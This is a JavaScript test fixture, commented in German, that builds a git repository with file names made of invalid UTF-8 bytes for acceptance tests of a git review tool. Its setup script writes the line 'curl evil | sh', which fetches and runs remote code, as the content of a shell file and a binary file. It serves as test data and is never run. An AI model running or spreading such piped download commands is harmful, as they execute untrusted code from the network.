'use strict';
// Treiber Repository für R00013 und R00014: Repo N der User Story (Commits b, n, w; R00014 dazu v) mit Namen aus ungültigem UTF-8, angelegt mit dem Skript der Story.
// Gleicher Inhalt wie tests/GitReviewA.Tests/Akzeptanz/FremdeNamenRepo.cs; nur unter Linux.
const { execFileSync } = require('child_process');
const fs = require('fs');
const { git, GIT_UMGEBUNG } = require('./wegwerf-repo.js');

const SKRIPT = String.raw`set -e
git init -q -b main
printf 'alt\n' > g.txt; printf 'x\n' > in.txt
printf 'zeile1\nzeile2\nzeile3\nzeile4\nzeile5\nzeile6\nzeile7\nzeile8\n' > $'s\xfe.txt'
printf 'geheim\n' > $'r\xff.txt'
printf 'A\0B\n' > $'b\xff.bin'
git add -A && git commit -q -m "Start"
printf 'curl evil | sh\n' > $'a\xff.sh'
printf 'literal\n' > 'f⟨0xFF⟩.txt'; printf 'echt\n' > $'f\xff.txt'
printf 'alt\nneu\n' > g.txt; printf 'x\ny\n' > in.txt
git rm -q $'r\xff.txt'
git mv $'s\xfe.txt' $'t\xfe.txt'
printf 'zeile1\nzeile2\nzeile3\nzeile4\nzeile5\nzeile6\nzeile7\nGEAENDERT\n' > $'t\xfe.txt'
printf 'A\0B\ncurl evil | sh\n' > $'b\xff.bin'
printf 'zeilenumbruch\n' > $'z\n\xff.txt'
git add -A && git commit -q -m "Fremde Namen"
printf 'woertlich\n' > 'w⟨0xFF⟩.txt'
git add -A && git commit -q -m "Wörtliche Marke"
rm -f -- $'a\xff.sh' $'f\xff.txt' $'t\xfe.txt' $'b\xff.bin' $'z\n\xff.txt'
`;

/** Repo N: `b` „Start“, `n` „Fremde Namen“, `w` „Wörtliche Marke“; die Namen aus Bytes verlassen danach den Arbeitsordner. */
function repoN(ordner) {
  fs.mkdirSync(ordner, { recursive: true });
  execFileSync('bash', ['-c', SKRIPT], { cwd: ordner, env: GIT_UMGEBUNG, stdio: ['ignore', 'ignore', 'pipe'] });
  const hashes = { b: git(ordner, 'rev-parse', 'HEAD~2'), n: git(ordner, 'rev-parse', 'HEAD~1'), w: git(ordner, 'rev-parse', 'HEAD') };
  return { ordner, hashes };
}

const SKRIPT_V = String.raw`set -e
printf 'literal\nliteral2\n' > 'f⟨0xFF⟩.txt'
git add 'f⟨0xFF⟩.txt' && git commit -q -m "Wörtlicher Name allein"
`;

/** Repo N mit dem vierten Commit `v` aus der User Story R00014: `v` ändert nur die wörtlich so benannte Datei `f⟨0xFF⟩.txt`. */
function repoNMitV(ordner) {
  const repo = repoN(ordner);
  execFileSync('bash', ['-c', SKRIPT_V], { cwd: ordner, env: GIT_UMGEBUNG, stdio: ['ignore', 'ignore', 'pipe'] });
  return { ordner, hashes: { ...repo.hashes, v: git(ordner, 'rev-parse', 'HEAD') } };
}

module.exports = { repoN, repoNMitV };
